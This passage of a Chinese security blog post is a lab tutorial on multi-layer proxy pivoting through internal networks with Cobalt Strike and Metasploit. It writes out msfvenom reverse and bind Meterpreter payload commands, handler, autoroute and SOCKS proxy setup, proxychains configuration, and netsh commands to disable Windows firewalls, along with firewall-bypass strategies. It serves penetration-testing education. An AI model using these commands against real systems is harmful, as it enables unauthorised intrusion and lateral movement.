+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614866336-3dd78c9a-7b24-4492-80f8-819403627ed9.png"></p>
+<p>注意端口是cs服务器端口</p>
+<p>然后代理服务器</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612305228-2ac125e2-0372-471d-9785-c805929ac90f.png"></p>
+<p>选4a扩展</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614953855-ca5d29c6-9164-4177-bc3e-9f4176809892.png"></p>
+<p>测试一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614969731-8fd92125-3478-43de-8a92-317e7b9c845d.png"></p>
+<p>再加规则</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612549574-0b085cb1-400e-4e18-a90d-e03cc0efdb83.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615005316-051de770-2f6a-4231-9388-208b2bbd2dbc.png"></p>
+<p>测试成功</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612811637-bc50caec-f473-409f-9292-bd35bab8ed02.png"></p>
+<p>这个时候在攻击机win上fscan一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615081496-ebe95fa7-bc8e-4f15-b385-fd545fd27ecb.png"></p>
+<p>现在开始往192.168.2.22移动</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616003616-e4603ac7-4a0d-4abf-a50c-376f1e26fa46.png"></p>
+<p>看到没有ip<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616034675-7b1a3e99-30a5-47ac-a0b5-4c18daa023f4.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616389453-8bb0c833-b9f0-4664-a031-c699ddc690b6.png"></p>
+<p>传到sql机器上，然后sql机器运行exe，</p>
+<p>发现sql机器4444端口监听</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616603320-93ed0c06-197e-4045-a093-3516b4d54da8.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616670409-6291dd85-1e84-48c4-96fd-f78b456c3003.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616691591-2265172d-08c0-4ebc-b48d-1bde4f7451ba.png"></p>
+<p>在2.22服务器上再来一次socket代理，还是c2服务器的ip</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617230971-8319e350-1271-4016-baf6-b56fb5a6e9ea.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617267483-d3c43f8e-18af-49de-8573-16936cebd216.png"></p>
+<p>攻击机能访问到</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617302027-75a0e459-221c-44b4-bbf7-cce596ae57f1.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617388779-3b1f8323-ffd8-4558-a3d8-4c79735eaf26.png"></p>
+<p>然后也是不能反向，接着正向链接</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618095091-1fdf9d21-8ab0-45ec-8b9e-dbafeaffbcbe.png"></p>
+<p>然后要通4.22，就要在3.22的基础上在sock</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618208549-c93a9757-2794-49fd-adbb-01a076e59d61.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618258339-4b7a43d9-f093-4bd4-82de-8a892d89db53.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618361704-e51ec4d8-e9ec-4950-818e-1c9bc45d96dd.png"></p>
+<p>成功</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618846346-eb6cc5b8-a647-490f-80fd-a412260fe218.png"> </p>
+<h3 id="msf演示"><a href="#msf演示" class="headerlink" title="msf演示"></a>msf演示</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750098640-8cd02866-23f4-44b0-a6bb-813b38439318.png"></p>
+<p>rename成3333.exe</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750758111-764dbce3-bfe2-4765-8399-3b013439d0d1.png"></p>
+<p>msf配置一下攻击exe</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750955349-24d3b6b9-3917-4d3a-a65e-b19eb5904141.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751067472-f4e0de94-29ad-4601-bfd4-beee7dd694db.png"></p>
+<p>上线</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751104085-1291c6be-4e5b-4817-a297-bb6cebabf7ed.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751699344-267f2b77-094b-4099-a63b-ddec156d034e.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751588615-c218bf9d-ef2f-4a7a-8eb1-c52561519683.png"></p>
+<p>获取路由，看到2网段被添加</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751155888-ded59b85-a070-45f3-a47e-3e9159089d5e.png"></p>
+<p>创建socks节点</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751372819-00a56ca6-d302-4e35-be1a-b5522528798d.png"></p>
+<p>绑定4444端口</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751386773-c633237c-d0f5-4129-82fc-43e22d6cdd79.png"></p>
+<p>job可以查看，此时proxifer也可以连，但是介绍proxychains</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751425674-154c14b8-4ac5-4064-8e72-756f56ae4be8.png"></p>
+<p>修改下配置文件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751938613-0c33a4ab-adae-4ad5-af07-2f27af08d38d.png"></p>
+<p>可以看到访问到了2.22的web服务</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752140181-0f13faf7-3ba1-4c5b-917a-b7e46d9dbff7.png"></p>
+<p>这里注意nmap扫不出来，因为协议问题，socks代理不出来</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752332292-83297104-3015-4e39-b6e3-00160500a56e.png"></p>
+<p>在此之后的因为无法直接访问，需要生成正向后门</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752529164-5d23a7d4-c89e-460b-bfa1-f67135aaaa3a.png"></p>
+<p>设置正向链接</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752728636-85c9205b-86fa-4f49-9d3f-df4fbc59db72.png"></p>
+<p>设置刚才正向要链接的端口地址，run</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752825727-062fa586-c3a8-43de-94ef-0fceb221fe9e.png"></p>
+<p>再设置代理，background返回，用代理模块，这里注意在设置之前注意设置的是session2，就要在sessions 2中把路由信息添加</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753072321-60f39b33-daf7-40e8-9ee4-d789cfaeb258.png"></p>
+<p>操作之后，在sessions2中看到3网段被添加了</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753109377-51cb82ea-fd7f-452e-8541-320ffaeb7940.png"></p>
+<p>再添加代理</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753163289-543a97f2-d179-46ff-988f-5c3615893c6d.png"></p>
+<p>可以访问到3.22</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753326387-7897dcd2-1a8c-41eb-8e95-2940e3dbb76e.png"></p>
+<p>同样的操作</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753459262-2aa835fe-215d-4ff7-b947-fbae4f8f91fa.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753839783-a9a7b599-778f-4a18-9da9-109adecd4159.png"></p>
+<p>添加路由</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753905250-ba4a8a0c-ecb7-4762-a163-49072f3c6356.png"></p>
+<p>然后设置代理模块</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754057908-aacbe4aa-4b2f-4ace-817b-67e32618b690.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754042506-3924a55e-efc6-4d3a-bd8b-20f02f0e7063.png"></p>
+<p>测试</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754107964-950347ef-5386-473c-a5d8-fe00df8211fe.png"></p>
+<p>同理再上线4.22，正向的时候可以用一个exe</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754329683-27a4f6e3-d4b7-4cf6-9b3b-82959fc9403a.png"></p>
+<p>这里设置一样，中间代理卡了一次重新搭了一次，又从4567会话开始搭建</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734755548263-b9db2142-8a8f-4e88-b54e-f6c91ad6141f.png"></p>
+<h3 id="SockS配置-网络不可达-通讯解决"><a href="#SockS配置-网络不可达-通讯解决" class="headerlink" title="SockS配置-网络不可达-通讯解决"></a>SockS配置-网络不可达-通讯解决</h3><p>解决：信息收集打点和漏洞利用部分</p>
+<p>注意：配置连接IP为C2服务器IP</p>
+<p>工具：Proxifier Proxychains等</p>
+<h4 id="Proxifier使用："><a href="#Proxifier使用：" class="headerlink" title="Proxifier使用："></a>Proxifier使用：</h4><p>图形化操作</p>
+<h4 id="Proxychains使用："><a href="#Proxychains使用：" class="headerlink" title="Proxychains使用："></a>Proxychains使用：</h4><p>加入修改配置： &#x2F;etc&#x2F;proxychains4.conf</p>
+<p>最下面</p>
+<p>socks5 127.0.0.1 8989</p>
+<p>如果是4a就是</p>
+<p>socks4a 127.0.0.1 8989 </p>
+<p>调用加载测试： proxychains4 curl <a target="_blank" rel="noopener" href="http://192.168.2.22/">http://192.168.2.22</a></p>
+<p>C2平台：MSF&#x2F;CS&#x2F;Sliver&#x2F;Viper等</p>
+<p>实现步骤：</p>
+<p>1、在被控机器上获取下一级网段</p>
+<p>2、在被控及其上建立SockS节点</p>
+<p>3、在工具上配置连接属性和规则触发</p>
+<h3 id="正反向监听-网络不可达-C2上线"><a href="#正反向监听-网络不可达-C2上线" class="headerlink" title="正反向监听-网络不可达-C2上线"></a>正反向监听-网络不可达-C2上线</h3><p>C2平台：MSF&#x2F;CS&#x2F;Sliver&#x2F;Viper等</p>
+<p>实现步骤：</p>
+<p>反向监听器：reverse</p>
+<p>正向监听器：bind（需主动连接）</p>
+<p>CS操作：</p>
+<p>直接-图形化操作</p>
+<p>MSF操作命令：</p>
+<h4 id="配置反向上线："><a href="#配置反向上线：" class="headerlink" title="配置反向上线："></a>配置反向上线：</h4><p>生产的后门在&#x2F;root目录下</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p>
+<p>msfconsole：</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>show options 看一下设置选项</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 3333</p>
+<p>run</p>
+<h4 id="查看路由表："><a href="#查看路由表：" class="headerlink" title="查看路由表："></a>查看路由表：</h4><p>run autoroute -p</p>
+<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
+<p>查看完记得输入background跳出会话</p>
+<h4 id="创建socks节点："><a href="#创建socks节点：" class="headerlink" title="创建socks节点："></a>创建socks节点：</h4><p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p>show options</p>
+<p>只用设置版本和端口（默认5）</p>
+<p>设置完要run</p>
+<h4 id="配置正向上线："><a href="#配置正向上线：" class="headerlink" title="配置正向上线："></a>配置正向上线：</h4><p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;xx -f exe -o msf.exe</p>
+<p>msfconsole:</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
+<p>set rhost xx.xx.xx.xx</p>
+<p>set lport 6666</p>
+<p>run</p>
+<p>主动链接  xx.xx.xx.xx：6666</p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768803502-aab59ed0-9d7a-4b0e-b422-e74eb2333609.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768793189-4b0eab75-a95d-408d-8f8c-9435de96db0f.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770686286-a22a5e28-7b1e-4811-a860-0bf4d6000785.png"></p>
+<p>全部启用</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770783583-242f228f-0b98-48ee-9908-c903367e620a.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770845216-7383e853-e345-41cc-9464-cc4ddda06faa.png"></p>
+<p>绿色是放行，未绿色标识不放行</p>
+<p>防火墙策略-入站规则&amp;出站规则&amp;自定义</p>
+<p>1、防火墙默认入站&amp;出站策略</p>
+<p>2、防火墙自定义入站&amp;出站策略</p>
+<p>内网域防火墙同步策略：</p>
+<p>操作：组策略管理-域-创建GPO链接-防火墙设置</p>
+<p>更新策略：强制&amp;命令&amp;重启</p>
+<p>命令：gpupdate&#x2F;force</p>
+<p>限制端口分为： 入站限制端口、出站限制端口、出入站均限制端口。</p>
+<p>入站限制端口，出站未限制端口，使用反向连接。</p>
+<p>出站限制端口，入站未限制端口，使用正向连接。</p>
+<p>出入站均限制端口，使用端口绕过进行连接，建议配合反向连接。</p>
+<p>限制协议分为：</p>
+<p>入站限制、出站限制、出入均限制，限制又分为：单协议限制、多协议限制、全部限制。</p>
+<h3 id="入站限制："><a href="#入站限制：" class="headerlink" title="入站限制："></a>入站限制：</h3><p>单协议限制，使用其它协议或者反向连接绕过。（隧道技术）</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771145479-35177ec4-3f01-459e-880f-bcb39de47f1a.png">这种情况就是先反向连2.11，在正向连2.22</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771408616-1e293ad7-8f9d-4bcd-94fd-47f58c953cc3.png"></p>
+<p> 这种情况因为sql上有web服务，如果要访问的话还需要配置入站规则。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771786168-c23e77b4-ea6b-4bb9-92ca-a91663bcd3cd.png"></p>
+<p>新建</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771865213-f5fdd4df-6d86-45e3-9dd5-1c01ffdc2e07.png"></p>
+<p>加80端口之后</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771968145-0ebe75a6-68b0-4e59-84d5-5a604ad83cc1.png"></p>
+<p>这里让2.22反向给2.11，此时对转发上线</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772200601-4dccb3f4-d2b8-4a61-84f8-aa532bb575ff.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772247956-2fdc01c9-aee3-41ca-9378-7a89315fb25c.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772327920-3eef69f6-02a2-4a2c-8cbd-089fbd657049.png"></p>
+<p>此时再让sql2.22上线</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773244500-dbab805e-0793-4fad-864b-43e1b87f5f73.png"></p>
+<p>多协议限制，使用未被限制的协议或者反向连接绕过。（隧道技术）</p>
+<p>全部协议限制，使用放弃或者反向连接绕过，但正常不会将所以协议都封闭的。</p>
+<h3 id="出站限制："><a href="#出站限制：" class="headerlink" title="出站限制："></a>出站限制：</h3><p>参考上面使用正向连接绕过。</p>
+<p>出入均限制：</p>
+<p>单协议限制，使用其它协议绕过。（隧道技术）</p>
+<p>多协议限制，使用未被限制的协议绕过。（隧道技术）</p>
+<p>全部协议限制，使用放弃绕过，但正常不会将所以协议都封闭的。</p>
+<p>单层目标机防火墙开启 上线解决方案：</p>
+<p>1、命令关闭防火墙</p>
+<p>2、反向中转连接上线</p>
+<p>3、利用隧道技术上线（规则决定）</p>
+<h3 id="单层跳板机防火墙开启上线解决方案："><a href="#单层跳板机防火墙开启上线解决方案：" class="headerlink" title="单层跳板机防火墙开启上线解决方案："></a>单层跳板机防火墙开启上线解决方案：</h3><p>1、命令关闭防火墙</p>
+<p>2、正向监听连接上线</p>
+<p>3、利用隧道技术上线（规则决定）</p>
+<h3 id="双层防火墙开启上线解决方案："><a href="#双层防火墙开启上线解决方案：" class="headerlink" title="双层防火墙开启上线解决方案："></a>双层防火墙开启上线解决方案：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773373028-5c999943-8224-45ca-90a4-1266822b1f56.png"></p>
+<p>此时双反向就行不行了， 因为2.22的反向出是需要到2.11的，此时对于2.11来说2.22的反向就相当于入</p>
+<p>1、命令关闭防火墙（连上web关闭他的防火墙此时可以像单层跳板机对2.22进行上线）</p>
+<p>在真实情况中就是都有防火墙的情况下，先拿下一台机器进行命令执行关闭防火墙，拿下后就是单层防火墙了</p>
+<p>2、SMB协议通讯上线（默认放行）</p>
+<p>3、利用隧道技术上线（规则决定）</p>
+<p>防火墙实验（适用场景）：</p>
+<p>1、内网无域环境下</p>
+<p>2、内网有域环境下（强制策略同步）</p>
+<p>gpupdate&#x2F;force</p>
+<p>Windows防火墙命令：</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p>
+<p>查看当前防火墙状态：netsh advfirewall show allprofiles</p>
+<p>关闭防火墙：netsh advfirewall set allprofiles state off</p>
+<p>开启防火墙：netsh advfirewall set allprofiles state on</p>
+<p>恢复初始防火墙设置：netsh advfirewall reset</p>
+<p>启用桌面防火墙: netsh advfirewall set allprofiles state on</p>
+<p>设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p>
+<p>如果设置为拒绝使用blockinbound,blockoutbound</p>
+<h3 id="域防火墙"><a href="#域防火墙" class="headerlink" title="域防火墙"></a>域防火墙</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734961544506-d07eeec5-ca89-4283-bfe8-63b35017a736.png"></p>
+<p>在域控创建个防火墙编辑一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734963840046-6c95890d-2cd7-4c63-a9e7-267f59f5bda3.png"></p>
+<p>配置一下防火墙</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734964118032-63f3404b-7f27-4044-bcc8-6f3b0be7a28d.png">改成默认值（入站检测出站不检测）</p>
+<h3 id="如何判断目标服务器出网协议"><a href="#如何判断目标服务器出网协议" class="headerlink" title="如何判断目标服务器出网协议"></a>如何判断目标服务器出网协议</h3><p>icmp就看能不能ping</p>
+<p>dns就看域名能不能解析</p>
+<p>ssh就看ssh连接会不会被阻止</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E6%BC%94%E7%A4%BA"><span class="toc-number">1.1.</span> <span class="toc-text">cs演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">msf演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SockS%E9%85%8D%E7%BD%AE-%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E8%BE%BE-%E9%80%9A%E8%AE%AF%E8%A7%A3%E5%86%B3"><span class="toc-number">1.3.</span> <span class="toc-text">SockS配置-网络不可达-通讯解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxifier%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">Proxifier使用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxychains%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">Proxychains使用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%8F%8D%E5%90%91%E7%9B%91%E5%90%AC-%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E8%BE%BE-C2%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.4.</span> <span class="toc-text">正反向监听-网络不可达-C2上线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%8F%8D%E5%90%91%E4%B8%8A%E7%BA%BF%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">配置反向上线：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">查看路由表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAsocks%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">创建socks节点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%AD%A3%E5%90%91%E4%B8%8A%E7%BA%BF%EF%BC%9A"><span class="toc-number">1.4.4.</span> <span class="toc-text">配置正向上线：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.</span> <span class="toc-text">防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E7%AB%99%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">入站限制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">出站限制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%B1%82%E8%B7%B3%E6%9D%BF%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%90%AF%E4%B8%8A%E7%BA%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">单层跳板机防火墙开启上线解决方案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%B1%82%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%90%AF%E4%B8%8A%E7%BA%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">双层防火墙开启上线解决方案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.5.</span> <span class="toc-text">域防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.6.</span> <span class="toc-text">如何判断目标服务器出网协议</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&text=多层代理搭建"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&is_video=false&description=多层代理搭建"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=多层代理搭建&body=Check out this article: https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
